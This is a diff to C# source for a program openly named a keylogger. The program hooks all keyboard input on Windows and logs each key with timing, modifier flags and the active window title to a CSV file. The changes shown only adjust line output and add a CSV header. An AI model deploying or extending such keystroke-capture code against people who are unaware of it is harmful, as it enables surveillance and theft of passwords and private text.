@@ -30,6 +30,7 @@ namespace dotnet_keylogger
         private static int left_shift = 0;
         private static int right_shift = 0;
         private static int win = 0;
+        private static bool newfile = false;
 
         private static StreamWriter sw;
 
@@ -168,7 +169,7 @@ namespace dotnet_keylogger
                 kflags += right_shift << 1;
                 kflags += win;
                 keylog K = new keylog(currentTime, diff, lParam, (byte)kflags, GetActiveWindowTitle(), GetActiveWindowName());
-                sw.Write(K.ToCSV());
+                sw.WriteLine(K.ToCSV());
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -230,15 +231,17 @@ namespace dotnet_keylogger
             Process[] p = Process.GetProcessesByName(pname);
             if (p.Length > 1)
                 Environment.Exit(0); /// already running, time to go bye bye
-            sw = new StreamWriter(@"C:\keylog_" + pname + "_" + Environment.UserName + @"_v2.csv", true);
+            string filepath = @"C:\keylog_" + pname + "_" + Environment.UserName + @"_v2.csv";
+            if (!File.Exists(filepath)) { newfile = true; }
+            sw = new StreamWriter(filepath, true);
             sw.AutoFlush = true;
+            if (newfile) { sw.WriteLine(keylog.OutCSVHeader()); }
             Thread thread_capslock_track = new Thread( new ThreadStart(TrackCapsLock));
             thread_capslock_track.Start();
             Thread thread_scrolllock_track = new Thread(new ThreadStart(TrackScrollLock));
             thread_scrolllock_track.Start();
             Thread thread_numlock_track = new Thread(new ThreadStart(TrackNumLock));
             thread_numlock_track.Start();
-
             _hookID = SetHook(_hook_callback_pointer);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
